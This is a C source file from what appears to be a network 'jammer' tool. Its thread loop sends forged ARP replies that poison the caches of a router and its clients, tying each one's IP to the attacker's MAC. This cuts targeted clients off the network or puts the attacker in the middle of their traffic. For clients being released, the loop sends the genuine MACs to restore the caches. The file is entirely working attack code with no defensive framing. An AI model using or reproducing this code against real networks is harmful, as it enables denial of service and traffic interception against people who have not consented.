#include "./process/jammer.h"
#include "./network.h"
#include "./arp.h"

#include <pthread.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>

#include <arpa/inet.h>

void *jam_jammed_devices(void *arg) {
    JammerArgs *args = (JammerArgs *)arg;
    Network *network = args->network;
    volatile bool *stop_flag = args->stop_flag;

    int sockfd = arp_create_socket();
    uint8_t my_mac[6];
    get_interface_mac(args->interface, my_mac);

    int cleanup = 3;
    while (cleanup) {
        pthread_mutex_lock(&network->lock);
        for (size_t i = 0; i < network->device_count; i++) {
            Device *device_router = &network->devices[i];
            if (device_router->type != ROUTER) {
                continue;
            }
            uint32_t router_ip = htonl(device_router->ip);
            
            for (size_t y = 0; y < network->device_count; y++) {
                Device *device_client = &network->devices[y];
                if (device_client->type != CLIENT) {
                    continue;
                }
                DeviceStatus status = device_client->status;
                if (status == JAMMING) {
                    uint32_t device_ip = htonl(device_client->ip);

                    arp_send_reply(sockfd, args->interface, my_mac, &device_ip, device_router->mac, &router_ip);
                    arp_send_reply(sockfd, args->interface, my_mac, &router_ip, device_client->mac, &device_ip);
                } else if (status == DISCONNECTING) {
                    uint32_t device_ip = htonl(device_client->ip);

                    arp_send_reply(sockfd, args->interface, device_client->mac, &device_ip, device_router->mac, &router_ip);
                    arp_send_reply(sockfd, args->interface, device_router->mac, &router_ip, device_client->mac, &device_ip);

                    if (device_client->disconnecting_counter++ > 4) {
                        device_client->status = INACTIVE;
                        device_client->disconnecting_counter = 0;
                    }
                }
            }
        }
        if (*stop_flag) {
            if (network_count_inactive(*network) == network->device_count) {
                break;
            }
            cleanup--;
        }
        pthread_mutex_unlock(&network->lock);

        sleep(2);
    }
    close(sockfd);
    return NULL;
}
